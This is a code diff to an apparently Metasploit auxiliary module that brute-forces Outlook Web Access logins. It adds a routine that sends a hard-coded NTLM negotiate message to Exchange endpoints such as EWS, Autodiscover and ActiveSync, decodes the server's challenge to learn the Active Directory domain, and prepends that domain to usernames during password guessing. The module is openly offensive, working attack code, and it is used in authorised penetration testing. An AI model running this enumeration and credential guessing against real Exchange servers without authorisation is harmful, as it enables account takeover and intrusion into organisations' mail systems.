@@ -4,6 +4,7 @@
 ##
 
 require 'msf/core'
+require 'rex/proto/ntlm/message'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -23,7 +24,8 @@ class Metasploit3 < Msf::Auxiliary
           'Vitor Moreira',
           'Spencer McIntyre',
           'SecureState R&D Team',
-          'sinn3r'
+          'sinn3r',
+          'Brandon Knight'
         ],
       'License'        => MSF_LICENSE,
       'Actions'        =>
@@ -67,6 +69,7 @@ class Metasploit3 < Msf::Auxiliary
     register_advanced_options(
       [
         OptString.new('AD_DOMAIN', [ false, "Optional AD domain to prepend to usernames", '']),
+        OptBool.new('ENUM_DOMAIN', [ true, "Automatically enumerate AD domain using NTLM authentication", true]),
         OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true])
       ], self.class)
 
@@ -111,18 +114,37 @@ class Metasploit3 < Msf::Auxiliary
     inbox_path  = action.opts['InboxPath']
     login_check = action.opts['InboxCheck']
 
+    domain = nil
+
+    if datastore['AD_DOMAIN'].nil? or datastore['AD_DOMAIN'] == ''
+      if datastore['ENUM_DOMAIN']
+        domain = get_ad_domain
+      end
+    else
+      domain = datastore['AD_DOMAIN']
+    end
+
     begin
       each_user_pass do |user, pass|
         vprint_status("#{msg} Trying #{user} : #{pass}")
-        try_user_pass(user, pass, auth_path, inbox_path, login_check, vhost)
+        try_user_pass({"user" => user, "domain"=>domain, "pass"=>pass, "auth_path"=>auth_path, "inbox_path"=>inbox_path, "login_check"=>login_check, "vhost"=>vhost})
       end
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
       print_error("#{msg} HTTP Connection Error, Aborting")
     end
   end
 
-  def try_user_pass(user, pass, auth_path, inbox_path, login_check, vhost)
-    user = datastore['AD_DOMAIN'] + '\\' + user if datastore['AD_DOMAIN'] != ''
+  def try_user_pass(opts)
+    user = opts["user"]
+    pass = opts["pass"]
+    auth_path = opts["auth_path"]
+    inbox_path = opts["inbox_path"]
+    login_check = opts["login_check"]
+    vhost = opts["vhost"]
+    domain = opts["domain"]
+
+    user = domain + '\\' + user if domain
+
     headers = {
       'Cookie' => 'PBack=0'
     }
@@ -204,8 +226,51 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
+  def get_ad_domain
+    urls = ["aspnet_client",
+      "Autodiscover",
+      "ecp",
+      "EWS",
+      "Microsoft-Server-ActiveSync",
+      "OAB",
+      "PowerShell",
+      "Rpc"]
+
+    domain = nil
+
+    begin
+      urls.each do |url|
+        res = send_request_cgi({
+          'encode'   => true,
+          'uri'      => "/#{url}",
+          'method'   => 'GET',
+          'headers'  =>  {"Authorization" => "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
+        })
+
+        if not res
+          print_error("#{msg} HTTP Connection Error, Aborting")
+          return nil
+        end
+
+        if res and res.code == 401 and res['WWW-Authenticate'].match(/^NTLM/i)
+          hash = res['WWW-Authenticate'].split('NTLM ')[1]
+          domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/,'')
+          print_good("Found target domain: " + domain)
+          return domain
+        end
+      end
+
+    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
+      print_error("#{msg} HTTP Connection Failed, Aborting")
+      return nil
+    end
+
+    return domain
+  end
+
   def msg
     "#{vhost}:#{rport} OWA -"
   end
 
 end
+
